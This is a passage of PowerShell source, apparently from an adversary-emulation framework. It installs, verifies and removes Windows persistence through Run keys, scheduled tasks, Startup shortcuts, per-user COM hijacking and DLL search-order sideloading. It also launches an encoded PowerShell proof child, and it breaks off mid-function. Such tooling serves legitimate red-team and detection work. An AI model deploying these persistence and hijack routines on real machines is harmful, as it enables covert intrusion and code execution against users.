      Register-ScheduledTask -TaskName $Loc.TaskName -Action $action -Trigger $trigger -Principal $principal -Description 'VARVEL governed range persistence (cleanup-proof tier - removal verified by persist-remove)' -Force -ErrorAction Stop | Out-Null
    }
    'startup' {
      $parts = Split-VvCommandLine $Target
      $ws = New-Object -ComObject WScript.Shell
      try {
        $sc = $ws.CreateShortcut($Loc.LnkPath)
        $sc.TargetPath = $parts.Exe
        $sc.Arguments = $parts.Args
        try { $sc.WorkingDirectory = (Split-Path $parts.Exe -Parent) } catch {}
        $sc.Description = 'VARVEL governed range persistence (cleanup-proof tier)'
        $sc.WindowStyle = 7
        $sc.Save()
      } finally { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($ws) }
    }
  }
}

function Clear-VvPersistTech($Loc) {
  switch ($Loc.Technique) {
    'runkey' { Remove-ItemProperty -LiteralPath $Loc.RegPath -Name $Loc.ValueName -Force -ErrorAction Stop }
    'schtask' { Unregister-ScheduledTask -TaskName $Loc.TaskName -Confirm:$false -ErrorAction Stop }
    'startup' { Remove-Item -LiteralPath $Loc.LnkPath -Force -ErrorAction Stop }
  }
}

# --- DEEP PERSISTENCE (stage 2): comhijack + dllsearch — the identical cleanup-proof ---
# --- doctrine against quieter USER-LAND locations. The standing boundary holds: NO  ---
# --- HKLM hives, NO services, NO WMI subscriptions. (Twin: the deep half of          ---
# --- engine/persist.mjs.)                                                          ---

function Test-VvPersistClsid([string]$Clsid) { return ([string]$Clsid -match '^\{[0-9A-Fa-f]{8}-([0-9A-Fa-f]{4}-){3}[0-9A-Fa-f]{12}\}$') }

function Get-VvPersistFileSha256([string]$Path) { return (Get-FileHash -LiteralPath $Path -Algorithm SHA256 -ErrorAction Stop).Hash.ToLower() }

function Probe-VvPersistFile([string]$Path) {
  if (Test-Path -LiteralPath $Path -PathType Leaf) { return @{ Present = $true; Sha256 = (Get-VvPersistFileSha256 $Path) } }
  return @{ Present = $false; Sha256 = $null }
}

# The trigger models - deep status carries one per technique, ALWAYS (what event loads
# us; stated, never implied).
function Get-VvPersistTriggerModel([string]$Tech) {
  switch ($Tech) {
    'comhijack' { return 'fires WHEN ANY user-context process calls CoCreateInstance/CreateObject on the hijacked CLSID - opportunistic, NOT a guaranteed timer: cadence depends entirely on what instantiates the class (a shadowed in-use class fires with its host app; an abandoned class may fire rarely - that is exactly why it is quiet)' }
    'dllsearch' { return 'fires at the next interactive logon of this user via the classic trigger (runkey/schtask) pointing at the COPIED signed host; the copy then search-order-loads our DLL from its own directory - guaranteed at next logon, two-stage' }
    default { return $null }
  }
}

# The manifest entry key for a deep technique: comhijack keys PER-CLSID (several
# hijacks coexist under one agent name handle); dllsearch keys per technique (its plant
# dir + trigger are name-derived - one plant per handle, like a classic technique).
function Get-VvDeepEntryKey([string]$Tech, $Deep) {
  if ($Tech -eq 'comhijack') { return 'comhijack-' + (([string]$Deep.clsid).ToUpper() -replace '[{}-]', '').Substring(0, 8) }
  return $Tech
}

# Probe the InprocServer32 (Default) of a CLSID in one hive ('HKLM' for classification
# ONLY - never written; 'HKCU' for the hijack itself).
function Probe-VvComRegistration([string]$Hive, [string]$Clsid) {
  $keyPath = ($Hive + ':\Software\Classes\CLSID\' + $Clsid.ToUpper())
  $isp = ($keyPath + '\InprocServer32')
  $item = Get-ItemProperty -LiteralPath $isp -Name '(Default)' -ErrorAction SilentlyContinue
  if ($null -ne $item -and $null -ne $item.'(Default)') { return @{ Present = $true; Value = [string]$item.'(Default)'; ContainerPresent = $true } }
  return @{ Present = $false; Value = $null; ContainerPresent = (Test-Path -LiteralPath $keyPath) }
}

# The candidate classifier (shadow-vs-safe) - the twin of classifyComCandidate in
# engine/persist.mjs. A user hijack of an HKLM-registered class SHADOWS it (the host
# app's behavior changes: higher impact, flagged); a class registered nowhere is
# 'safe-abandoned' (alters no working app - and is quiet BECAUSE nothing uses it; the
# trigger is opportunistic, never a timer).
function Get-VvComCandidateClass([string]$Clsid) {
  $hklm = Probe-VvComRegistration 'HKLM' $Clsid
  $hkcu = Probe-VvComRegistration 'HKCU' $Clsid
  if ($hkcu.Present) {
    return @{ classification = 'occupied-user'; shadow = $false; hklmPresent = $hklm.Present; hkcu = $hkcu;
      impact = 'a user-context registration already exists for this CLSID - a FOREIGN one is never clobbered silently (refuse, or overwrite journals it and restore-on-remove puts it back)' }
  }
  if ($hklm.Present) {
    return @{ classification = 'shadow'; shadow = $true; hklmPresent = $true; hklmValue = $hklm.Value; hkcu = $hkcu;
      impact = 'SHADOWS the machine-wide (HKLM) registration for THIS user - processes of this user that instantiate the class load OUR server instead of the real one: the host application''s behavior changes. HIGHER IMPACT - flagged loudly in evidence and audit; removal un-shadows (HKLM is never touched)' }
  }
  return @{ classification = 'safe-abandoned'; shadow = $false; hklmPresent = $false; hkcu = $hkcu;
    impact = 'no HKLM/HKCU registration exists - a user-context registration alters NO working application (instantiation previously failed with REGDB_E_CLASSNOTREG). HONEST TRIGGER TENSION: a genuinely abandoned class may be instantiated rarely - it is quiet BECAUSE nothing uses it; the trigger is opportunistic, not a timer' }
}

function Apply-VvComHijack([string]$Clsid, [string]$Dll) {
  $keyPath = ('HKCU:\Software\Classes\CLSID\' + $Clsid.ToUpper() + '\InprocServer32')
  New-Item -Path $keyPath -Force -ErrorAction Stop | Out-Null
  New-ItemProperty -LiteralPath $keyPath -Name '(Default)' -Value ([string]$Dll) -PropertyType String -Force -ErrorAction Stop | Out-Null
}

# Delete the hijack. When WE created the whole key chain (container did NOT pre-exist),
# the container goes too; when it pre-existed, only the subkey we added is removed.
# HKLM is never touched - removing the HKCU key of a shadow install simply un-shadows.
function Clear-VvComHijack([string]$Clsid, [bool]$ContainerPreExisted) {
  $clsidKey = ('HKCU:\Software\Classes\CLSID\' + $Clsid.ToUpper())
  $isp = ($clsidKey + '\InprocServer32')
  if ($ContainerPreExisted) {
    if (Test-Path -LiteralPath $isp) { Remove-Item -LiteralPath $isp -Recurse -Force -ErrorAction Stop }
  } else {
    if (Test-Path -LiteralPath $clsidKey) { Remove-Item -LiteralPath $clsidKey -Recurse -Force -ErrorAction Stop }
  }
}

# THE BENIGN RESOLVE-PROOF (persist-status prove:true, comhijack): a THROWAWAY child
# process instantiates the hijacked CLSID. Any outcome OTHER than REGDB_E_CLASSNOTREG
# (0x80040154) proves COM located our registration and attempted the load - the hijack
# RESOLVES (the payload's own loadability is a separate, stated fact). The child is
# confirmed to EXIT cleanly. The proof is read-only against the registry and changes no
# persistent state.
function Invoke-VvComResolveProof([string]$Clsid, [string]$WorkDir) {
  $proof = @{ attempted = $false; resolved = $false; hresult = $null; detail = $null; childExited = $false; childExitCode = $null }
  $body = @'
$clsid = '__CLSID__'
try {
  $t = [type]::GetTypeFromCLSID([Guid]$clsid)
  if ($null -eq $t) {
    Write-Output 'COMPROOF|0|null-type|GetTypeFromCLSID returned null - the class does not resolve'
  } else {
    try {
      $obj = [Activator]::CreateInstance($t)
      Write-Output 'COMPROOF|1|0|object created - the registered server for the hijacked CLSID loaded into this throwaway child'
    } catch {
      $hr = ''
      try { $hr = ('0x{0:X8}' -f $_.Exception.HResult) } catch {}
      $msg = ([string]$_.Exception.Message) -replace '[\r\n|]+', ' '
      if ($msg -match '80040154' -or $msg -match '(?i)class not registered') {
        Write-Output ('COMPROOF|0|' + $hr + '|class not registered (0x80040154) - the hijack does NOT resolve')
      } else {
        Write-Output ('COMPROOF|1|' + $hr + '|COM located our registration and attempted the load: ' + $msg)
      }
    }
  }
} catch {
  $m = ([string]$_.Exception.Message) -replace '[\r\n|]+', ' '
  Write-Output ('COMPROOF|0||' + $m)
}
'@
  $body = $body.Replace('__CLSID__', $Clsid)
  try {
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($body))
    # ProcessStartInfo with UseShellExecute=$false: WaitForExit/ExitCode are reliable
    # (Start-Process -PassThru can return a handle whose ExitCode never populates), and
    # stdout/stderr ride pipes - no scratch files at all.
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = 'powershell.exe'
    $psi.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ' + $encoded
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.CreateNoWindow = $true
    $p = [System.Diagnostics.Process]::Start($psi)
    $proof.attempted = $true
    if (-not $p.WaitForExit(20000)) {
      try { $p.Kill() } catch {}
      $proof.detail = 'proof child timed out after 20s - killed; the proof is inconclusive, reported honestly'
      return $proof
    }
    $proof.childExited = $true
    try { $proof.childExitCode = $p.ExitCode } catch { $proof.childExitCode = $null }
    $childOut = ''
    try { $childOut = $p.StandardOutput.ReadToEnd() } catch {}
    $line = $null
    if ($childOut) { $line = ($childOut -split "`r?`n") | Where-Object { $_ -match '^COMPROOF\|' } | Select-Object -First 1 }
    if ($line) {
      $parts = ([string]$line).Split('|')
      $proof.resolved = ($parts[1] -eq '1')
      if ($parts.Count -ge 3 -and $parts[2]) { $proof.hresult = $parts[2] }
      if ($parts.Count -ge 4 -and $parts[3]) {
        $proof.detail = ($parts[3..($parts.Count - 1)] -join '|')
        $m = [regex]::Match([string]$proof.detail, 'HRESULT: (0x[0-9A-Fa-f]{8})')
        if ($m.Success) { $proof.hresult = $m.Groups[1].Value } # the COM-level HRESULT, not the .NET wrapper's
      }
    } else {
      $proof.detail = 'the proof child produced no COMPROOF marker (inconclusive, reported honestly)'
    }
    try { $p.Dispose() } catch {}
  } catch {
    $proof.detail = 'proof launch failed: ' + [string]$_.Exception.Message
  }
  return $proof
}

# The deep params validator (defense in depth - the same rules as parseDeepParams in
# engine/persist.mjs; the channel's spec gate already ran server-side).
function Assert-VvDeepParams([string]$Tech, $Deep) {
  if ($null -eq $Deep) { throw "persist: deep technique '$Tech' needs a 'deep' params object" }
  $absRe = '^([A-Za-z]:\\|\\\\|%[A-Za-z]+%\\)'
  if ($Tech -eq 'comhijack') {
    if (-not (Test-VvPersistClsid ([string]$Deep.clsid))) { throw "persist: deep.clsid '$($Deep.clsid)' is not a CLSID ({GUID})" }
    $dll = [string]$Deep.dll
    if (-not $dll -or $dll -notmatch $absRe -or $dll -notmatch '\.dll$' -or $dll.Contains('..')) { throw "persist: deep.dll must be an ABSOLUTE .dll path without '..'" }
    return
  }
  if ($Tech -eq 'dllsearch') {
    $h = [string]$Deep.host; $dll = [string]$Deep.dll; $as = ([string]$Deep.as).ToLower()
    if (-not $h -or $h -notmatch $absRe -or $h -notmatch '\.exe$' -or $h.Contains('..')) { throw "persist: deep.host must be an ABSOLUTE .exe path without '..'" }
    if (-not $dll -or $dll -notmatch $absRe -or $dll -notmatch '\.dll$' -or $dll.Contains('..')) { throw "persist: deep.dll must be an ABSOLUTE .dll path without '..'" }
    $allow = @('version.dll', 'winmm.dll', 'dbghelp.dll', 'dbgcore.dll', 'cryptsp.dll', 'profapi.dll', 'apphelp.dll')
    if ($allow -notcontains $as) { throw "persist: deep.as must be one of $($allow -join ', ') (the execproxy stage-1 search-order allowlist, reused)" }
    $trig = $(if ($Deep.trigger) { ([string]$Deep.trigger).ToLower() } else { 'runkey' })
    if (@('runkey', 'schtask') -notcontains $trig) { throw "persist: deep.trigger must be one of runkey, schtask" }
    return
  }
  throw "persist: unknown deep technique '$Tech'"
}

# The deep evidence row: the classic fields PLUS the trigger model (always) and the
# per-technique deep fields.
function New-VvDeepEv([string]$Tech, [string]$Key, [string]$Location, [string]$Target, $Deep) {
  $ev = [ordered]@{
    state = 'failed'; technique = $Tech; entryKey = $Key; location = $Location
    target = $(if ($Target) { $Target } else { $null }); targetSha256 = $(if ($Target) { Get-VvPersistSha256Hex $Target } else { $null })
    preExisted = $false; overwriteJournaled = $false
    installVerified = $null; removalVerified = $null; journalRestored = $null
    triggerModel = (Get-VvPersistTriggerModel $Tech)
    note = $null; error = $null
  }
  if ($Tech -eq 'comhijack') {
    $ev.clsid = ([string]$Deep.clsid).ToUpper(); $ev.dll = [string]$Deep.dll
    $ev.classification = $null; $ev.shadow = $false; $ev.dllSha256 = $null; $ev.resolveProof = $null
  } elseif ($Tech -eq 'dllsearch') {
    $ev.host = [string]$Deep.host; $ev.as = ([string]$Deep.as).ToLower(); $ev.dll = [string]$Deep.dll
    $ev.plantDir = $null; $ev.trigger = $null
    $ev.dllSha256 = $null; $ev.hostSha256 = $null; $ev.hostSigStatus = $null; $ev.hostSigner = $null
    $ev.files = @()
  }
  return $ev
}

function Save-VvDeepEntry($Manifest, [string]$Key, [string]$Tech, $Ev, $DeepJournal, $PreInstall, [bool]$Journaled) {
  $prev = $Manifest.entries[$Key]
  $Manifest.entries[$Key] = @{
    technique = $Tech; location = $Ev.location; targetSha256 = $Ev.targetSha256
    deep = $DeepJournal
    preInstall = $PreInstall
    overwriteJournaled = $Journaled
    # honest state: an install whose write did NOT verify is recorded as 'failed' (the
    # entry exists so remove can still take it back - the sweep re-probes live)
    state = $(if ($Ev.state -eq 'installed') { 'installed' } else { 'failed' })
    installedAt = $(if ($prev -and $prev.installedAt) { [string]$prev.installedAt } else { [DateTime]::UtcNow.ToString('o') })
    removedAt = $null; removalVerified = $null
  }
}

# comhijack install: classify the candidate FIRST (shadow-vs-safe), require the staged
# payload (existence + sha256 evidence), snapshot the pre-install value, refuse/journal
# a foreign value, write the hijack, PROVE by re-read.
function Install-VvDeepComHijack([string]$Key, [string]$Name, $Deep, $Manifest, [bool]$Overwrite) {
  $clsid = ([string]$Deep.clsid).ToUpper()
  $dll = [string]$Deep.dll
  $location = ('HKCU\Software\Classes\CLSID\' + $clsid + '\InprocServer32')
  $ev = New-VvDeepEv 'comhijack' $Key $location $dll $Deep
  try {
    $cls = Get-VvComCandidateClass $clsid
    $ev.classification = [string]$cls.classification
    $ev.shadow = ($cls.shadow -eq $true)
    $probe = Probe-VvPersistFile $dll
    if (-not $probe.Present) { $ev.error = 'payload DLL not found at ' + $dll + ' - stage it into the governed sandbox first (nothing written)'; return $ev }
    $ev.dllSha256 = $probe.Sha256
    $pre = Probe-VvComRegistration 'HKCU' $clsid
    $ev.preExisted = $pre.Present
    $journal = @{ technique = 'comhijack'; clsid = $clsid; dll = $dll; dllSha256 = $ev.dllSha256; classification = $ev.classification; shadow = $ev.shadow; containerPresent = $pre.ContainerPresent }
    if ($pre.Present -and ([string]$pre.Value) -eq $dll) {
      $ev.state = 'installed'; $ev.installVerified = $true
      $ev.note = 'already installed and intact (the InprocServer32 re-read matches the payload path) - idempotent no-op'
      Save-VvDeepEntry $Manifest $Key 'comhijack' $ev $journal @{ present = $true; value = $null; valueSha256 = $null } $false
      return $ev
    }
    if ($pre.Present -and -not $Overwrite) {
      $ev.state = 'refused-clobber'
      $ev.note = 'the InprocServer32 already holds a FOREIGN value (sha256 ' + (Get-VvPersistSha256Hex ([string]$pre.Value)).Substring(0, 12) + '...) - REFUSED to clobber it silently. Re-task with overwrite:true to journal the old value and replace it; the journal restores it on remove.'
      return $ev
    }
    if ($pre.Present) { $ev.overwriteJournaled = $true }
    Apply-VvComHijack $clsid $dll
    $post = Probe-VvComRegistration 'HKCU' $clsid
    $ev.installVerified = ($post.Present -and ([string]$post.Value) -eq $dll)
    if (-not $ev.installVerified) {
      $ev.state = 'failed'
      $ev.error = 'hijack write did NOT verify (re-read mismatch - the InprocServer32 does not hold the payload path). Nothing claimed; remove will still take this entry back.'
    } else {
      $ev.state = 'installed'
      $ev.note = $(if ($ev.shadow) { 'SHADOW install: ' } else { 'safe-abandoned install: ' }) + [string]$cls.impact
    }
    Save-VvDeepEntry $Manifest $Key 'comhijack' $ev $journal @{ present = $pre.Present; value = $(if ($ev.overwriteJournaled) { [string]$pre.Value } else { $null }); valueSha256 = $(if ($pre.Present) { Get-VvPersistSha256Hex ([string]$pre.Value) } else { $null }) } $ev.overwriteJournaled
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

# dllsearch install: the execproxy sideload plant (COPIES ONLY into the governed dir -
# foreign bytes are a loud refused-clobber, plants proven by sha256 re-read) PLUS a
# classic runkey/schtask trigger pointing at the COPY, armed LAST, with the classic
# registry discipline (snapshot / refuse-or-journal / re-read verify).
function Install-VvDeepDllSearch([string]$Key, [string]$Name, $Deep, $Manifest, [bool]$Overwrite, [string]$ManifestPath) {
  $sandbox = Split-Path $ManifestPath -Parent
  if (-not $sandbox) { $sandbox = (Get-Location).Path }
  $plantDir = Join-Path $sandbox ('persist-dllsearch-' + $Name)
  $hostBase = Split-Path ([string]$Deep.host) -Leaf
  $hostCopy = Join-Path $plantDir $hostBase
  $as = ([string]$Deep.as).ToLower()
  $dllAs = Join-Path $plantDir $as
  $targetLine = '"' + $hostCopy + '"'
  $triggerTech = $(if ($Deep.trigger) { ([string]$Deep.trigger).ToLower() } else { 'runkey' })
  $trigLoc = Get-VvPersistLoc $triggerTech $Name
  $ev = New-VvDeepEv 'dllsearch' $Key $trigLoc.Location $targetLine $Deep
  $ev.plantDir = $plantDir
  $ev.trigger = @{ technique = $triggerTech; location = $trigLoc.Location }
  $journal = @{ technique = 'dllsearch'; host = [string]$Deep.host; hostSha256 = $null; as = $as; dll = [string]$Deep.dll; dllSha256 = $null; plantDir = $plantDir; trigger = @{ technique = $triggerTech; location = $trigLoc.Location; value = $targetLine; targetSha256 = (Get-VvPersistSha256Hex $targetLine) }; files = @() }
  try {
    $dllProbe = Probe-VvPersistFile ([string]$Deep.dll)
    if (-not $dllProbe.Present) { $ev.error = 'payload DLL not found at ' + [string]$Deep.dll + ' - stage it into the governed sandbox first (nothing planted, nothing armed)'; return $ev }
    $ev.dllSha256 = $dllProbe.Sha256; $journal.dllSha256 = $dllProbe.Sha256
    $hostProbe = Probe-VvPersistFile ([string]$Deep.host)
    if (-not $hostProbe.Present) { $ev.error = 'sideload host not found at ' + [string]$Deep.host + ' - discovery (tools/execproxy.mjs) ranks candidates; nothing planted, nothing armed'; return $ev }
    $ev.hostSha256 = $hostProbe.Sha256; $journal.hostSha256 = $hostProbe.Sha256
    try {
      $sig = Get-AuthenticodeSignature -LiteralPath ([string]$Deep.host) -ErrorAction Stop
      $ev.hostSigStatus = [string]$sig.Status
      if ($sig.SignerCertificate) { $ev.hostSigner = [string]$sig.SignerCertificate.Subject }
    } catch {}
    if (-not (Test-Path -LiteralPath $plantDir)) { New-Item -ItemType Directory -Force -Path $plantDir -ErrorAction Stop | Out-Null }
    $plants = @(
      @{ role = 'host-copy'; path = $hostCopy; copyFrom = [string]$Deep.host; want = $ev.hostSha256 },
      @{ role = 'dll-as'; path = $dllAs; copyFrom = [string]$Deep.dll; want = $ev.dllSha256 }
    )
    foreach ($f in $plants) {
      $rec = [ordered]@{ role = $f.role; path = $f.path; sha256 = $null; present = $false; planted = $false; preExisted = $false; removalVerified = $null }
      $preF = Probe-VvPersistFile $f.path
      $rec.preExisted = $preF.Present
      if ($preF.Present) {
        if ($preF.Sha256 -ne $f.want) {
          $rec.present = $true; $rec.sha256 = $preF.Sha256
          $ev.files = @($ev.files) + $rec
          $ev.state = 'refused-clobber'
          $ev.error = 'plant target already holds FOREIGN bytes (sha256 ' + $preF.Sha256.Substring(0, 12) + '...): ' + $f.path + ' - REFUSED to clobber it silently (files are never journaled). persist-remove this name first, or pick another name handle.'
          $journal.files = @($ev.files | ForEach-Object { @{ role = $_.role; path = $_.path; sha256 = $_.sha256; planted = ($_.planted -eq $true) } })
          Save-VvDeepEntry $Manifest $Key 'dllsearch' $ev $journal @{ present = $false; value = $null; valueSha256 = $null } $false
          return $ev
        }
        $rec.present = $true; $rec.sha256 = $preF.Sha256; $rec.planted = $true
        $ev.files = @($ev.files) + $rec
        continue
      }
      Copy-Item -LiteralPath $f.copyFrom -Destination $f.path -Force -ErrorAction Stop
      $postF = Probe-VvPersistFile $f.path
      if (-not $postF.Present -or $postF.Sha256 -ne $f.want) {
        $rec.present = $postF.Present; $rec.sha256 = $postF.Sha256
        $ev.files = @($ev.files) + $rec
        $ev.error = 'plant write did NOT verify (sha256 re-read mismatch) for ' + $f.path + ' - the plant is UNVERIFIED, reported honestly; remove will still take this entry back'
        $journal.files = @($ev.files | ForEach-Object { @{ role = $_.role; path = $_.path; sha256 = $_.sha256; planted = ($_.planted -eq $true) } })
        Save-VvDeepEntry $Manifest $Key 'dllsearch' $ev $journal @{ present = $false; value = $null; valueSha256 = $null } $false
        return $ev
      }
      $rec.present = $true; $rec.sha256 = $postF.Sha256; $rec.planted = $true
      $ev.files = @($ev.files) + $rec
    }
    $journal.files = @($ev.files | ForEach-Object { @{ role = $_.role; path = $_.path; sha256 = $_.sha256; planted = ($_.planted -eq $true) } })
    # THE TRIGGER - armed LAST, the classic dance against the runkey/schtask location.
    $pre = Probe-VvPersistTech $trigLoc
    $ev.preExisted = $pre.Present
    $canon = ConvertTo-VvCanonicalTarget $targetLine
    if ($pre.Present -and (ConvertTo-VvCanonicalTarget ([string]$pre.Value)) -eq $canon) {
      $ev.state = 'installed'; $ev.installVerified = $true
      $ev.note = 'already installed and intact (plants hash-verified; the trigger re-read matches the copied-host line) - idempotent no-op'
      Save-VvDeepEntry $Manifest $Key 'dllsearch' $ev $journal @{ present = $true; value = $null; valueSha256 = $null } $false
      return $ev
    }
    if ($pre.Present -and -not $Overwrite) {
      $ev.state = 'refused-clobber'
      $ev.note = 'the trigger location already holds a FOREIGN value (sha256 ' + (Get-VvPersistSha256Hex ([string]$pre.Value)).Substring(0, 12) + '...) - REFUSED to clobber it silently. The plant files are journaled and remove takes them back; re-task with overwrite:true to journal the old trigger value and replace it.'
      Save-VvDeepEntry $Manifest $Key 'dllsearch' $ev $journal @{ present = $false; value = $null; valueSha256 = $null } $false
      return $ev
    }
    if ($pre.Present) { $ev.overwriteJournaled = $true }
    Apply-VvPersistTech $trigLoc $targetLine
    $post = Probe-VvPersistTech $trigLoc
    $triggerOk = ($post.Present -and (ConvertTo-VvCanonicalTarget ([string]$post.Value)) -eq $canon)
    $ev.installVerified = ($triggerOk -and (@($ev.files | Where-Object { $_.planted -eq $true }).Count -eq $plants.Count))
    if (-not $ev.installVerified) {
      $ev.state = 'failed'
      $ev.error = 'the dllsearch install did NOT fully verify (trigger re-read or a plant mismatch) - nothing claimed; remove will still take this entry back.'
    } else {
      $ev.state = 'installed'
      $ev.note = 'plants sha256-verified in the governed dir and the ' + $triggerTech + ' trigger re-read-verified pointing at the COPY - whether the copied host search-order-loads the planted name on this build is MEASURED per engagement (execproxy marker/edrview), never claimed'
    }
    Save-VvDeepEntry $Manifest $Key 'dllsearch' $ev $journal @{ present = $pre.Present; value = $(if ($ev.overwriteJournaled) { [string]$pre.Value } else { $null }); valueSha256 = $(if ($pre.Present) { Get-VvPersistSha256Hex ([string]$pre.Value) } else { $null }) } $ev.overwriteJournaled
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

# Deep status: LIVE re-read (measured now, never remembered) + the trigger model
# (always) + the benign resolve-proof for comhijack when prove:true.
function Get-VvDeepStatusOne([string]$Key, [string]$Tech, [string]$Name, $Deep, $Manifest, [bool]$Prove, [string]$ManifestPath) {
  $entry = $Manifest.entries[$Key]
  if ($null -eq $Deep -and $null -ne $entry -and $null -ne $entry.deep) { $Deep = $entry.deep }
  if ($null -eq $Deep) {
    return [ordered]@{
      state = 'absent'; technique = $Tech; entryKey = $Key; location = $null; target = $null; targetSha256 = $null
      preExisted = $false; overwriteJournaled = $false; installVerified = $null; removalVerified = $null; journalRestored = $null
      triggerModel = (Get-VvPersistTriggerModel $Tech)
      note = 'no manifest entry and no deep params supplied - a deep location is parameter-derived (a CLSID / a governed plant dir), so there is nothing to re-read; NOT claimed present, never assumed removed-out-of-band'
      error = $null
    }
  }
  if ($Tech -eq 'comhijack') {
    $clsid = ([string]$Deep.clsid).ToUpper()
    $dll = [string]$Deep.dll
    $ev = New-VvDeepEv 'comhijack' $Key ('HKCU\Software\Classes\CLSID\' + $clsid + '\InprocServer32') $dll $Deep
    try {
      if ($null -ne $entry -and $null -ne $entry.deep) {
        $ev.classification = [string]$entry.deep.classification; $ev.shadow = ($entry.deep.shadow -eq $true); $ev.dllSha256 = [string]$entry.deep.dllSha256
      }
      $cur = Probe-VvComRegistration 'HKCU' $clsid
      if ($null -ne $entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
      if ($cur.Present -and ([string]$cur.Value) -eq $dll) {
        $ev.state = 'installed'; $ev.installVerified = $true
        $ev.note = $(if ($null -ne $entry) { 'hijack present and intact (the InprocServer32 re-read matches the payload path)' } else { 'hijack present and intact (value-identified as ours; no manifest entry)' }) + $(if ($ev.shadow) { ' - SHADOW: this hijack shadows an HKLM registration (higher impact, flagged at install)' } else { '' })
        if ($Prove) { $ev.resolveProof = Invoke-VvComResolveProof $clsid (Split-Path $ManifestPath -Parent) }
      } elseif ($cur.Present) {
        if ($null -ne $entry -and $entry.state -eq 'installed') {
          $ev.state = 'tampered'
          $ev.note = 'the InprocServer32 holds a DIFFERENT value than this agent installed (sha256 ' + (Get-VvPersistSha256Hex ([string]$cur.Value)).Substring(0, 12) + '...) - changed since install; reporting honestly'
        } else {
          $ev.state = 'foreign-present'
          $ev.note = 'the InprocServer32 holds a value this agent never installed - not ours, never claimed'
        }
        if ($Prove) { $ev.resolveProof = @{ attempted = $false; resolved = $false; hresult = $null; detail = 'proof SKIPPED: the value present is not this agent''s (tampered/foreign) - instantiating someone else''s server is not a benign proof'; childExited = $false; childExitCode = $null } }
      } elseif ($null -ne $entry -and $entry.removalVerified -eq $true) {
        $ev.state = 'removed'; $ev.removalVerified = $true
        $ev.note = 'verified absent (removal was proven at ' + $(if ($entry.removedAt) { [string]$entry.removedAt } else { 'remove time' }) + '; still absent at this live re-read - the CLSID resolves exactly as it did pre-install)'
      } elseif ($null -ne $entry -and $entry.state -eq 'installed') {
        $ev.state = 'missing'
        $ev.note = 'manifest says installed but the hijack is GONE - removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.'
      } else {
        $ev.state = 'absent'
        $ev.note = 'not installed (no manifest entry, the InprocServer32 is clean at live re-read)'
      }
      if ($Prove -and $null -eq $ev.resolveProof -and $ev.state -ne 'installed') {
        $ev.resolveProof = @{ attempted = $false; resolved = $false; hresult = $null; detail = 'proof SKIPPED: the hijack is not installed (state ' + $ev.state + ') - there is nothing of ours to resolve'; childExited = $false; childExitCode = $null }
      }
    } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
    return $ev
  }
  # dllsearch status: trigger re-read + per-file hash re-read.
  $targetLine = $(if ($Deep.trigger -and $Deep.trigger.value) { [string]$Deep.trigger.value } else { $null })
  $triggerTech = $(if ($Deep.trigger -and $Deep.trigger.technique) { ([string]$Deep.trigger.technique).ToLower() } else { 'runkey' })
  $trigLoc = Get-VvPersistLoc $triggerTech $Name
  $ev = New-VvDeepEv 'dllsearch' $Key $trigLoc.Location $targetLine $Deep
  try {
    $plantDir = $(if ($Deep.plantDir) { [string]$Deep.plantDir } else { Join-Path (Split-Path $ManifestPath -Parent) ('persist-dllsearch-' + $Name) })
    $ev.plantDir = $plantDir
    $ev.trigger = @{ technique = $triggerTech; location = $trigLoc.Location }
    if (-not $targetLine) { $targetLine = '"' + (Join-Path $plantDir (Split-Path ([string]$Deep.host) -Leaf)) + '"'; $ev.target = $targetLine; $ev.targetSha256 = Get-VvPersistSha256Hex $targetLine }
    if ($null -ne $entry -and $null -ne $entry.deep) { $ev.dllSha256 = [string]$entry.deep.dllSha256; $ev.hostSha256 = [string]$entry.deep.hostSha256 }
    $trig = Probe-VvPersistTech $trigLoc
    $canon = ConvertTo-VvCanonicalTarget $targetLine
    $anyPresent = ($trig.Present -eq $true)
    $anyTampered = ($trig.Present -and ((ConvertTo-VvCanonicalTarget ([string]$trig.Value)) -ne $canon))
    $anyUnverifiable = $false
    $recorded = @()
    if ($null -ne $entry -and $null -ne $entry.deep -and $null -ne $entry.deep.files) { $recorded = @($entry.deep.files) }
    if ($null -ne $entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
    foreach ($f in $recorded) {
      $rec = [ordered]@{ role = [string]$f.role; path = [string]$f.path; sha256 = $null; present = $false; planted = ($f.planted -eq $true); removalVerified = $null; state = $null }
      try {
        $curF = Probe-VvPersistFile ([string]$f.path)
        $rec.present = $curF.Present; $rec.sha256 = $curF.Sha256
        if ($rec.present) {
          $anyPresent = $true
          if ($f.sha256 -and $curF.Sha256 -eq ([string]$f.sha256)) { $rec.state = 'planted' } else { $rec.state = 'tampered'; $anyTampered = $true }
        } else {
          $rec.state = $(if ($null -ne $entry -and $entry.removalVerified -eq $true) { 'removed'; $rec.removalVerified = $true } else { 'absent' })
        }
      } catch { $rec.state = 'unknown'; $anyUnverifiable = $true }
      $ev.files = @($ev.files) + $rec
    }
    if ($anyTampered) {
      $ev.state = $(if ($null -ne $entry -and $entry.state -eq 'installed') { 'tampered' } else { 'foreign-present' })
      $ev.note = 'a dllsearch artifact CHANGED under us (trigger value or a planted file hash) - reported honestly; removal refuses to delete foreign bytes'
    } elseif ($anyPresent) {
      $ev.state = 'installed'; $ev.installVerified = $true
      $ev.note = 'trigger and plant files present and intact at live re-read (trigger line matches the copied host; every planted file hash-matches)'
    } elseif ($anyUnverifiable) {
      $ev.state = 'unknown'; $ev.note = 'a probe failed - never assume absence'
    } elseif ($null -ne $entry -and $entry.removalVerified -eq $true) {
      $ev.state = 'removed'; $ev.removalVerified = $true
      $ev.note = 'verified absent (removal was proven at ' + $(if ($entry.removedAt) { [string]$entry.removedAt } else { 'remove time' }) + '; trigger and every plant still absent at this live re-read)'
    } elseif ($null -ne $entry -and $entry.state -eq 'installed') {
      $ev.state = 'missing'
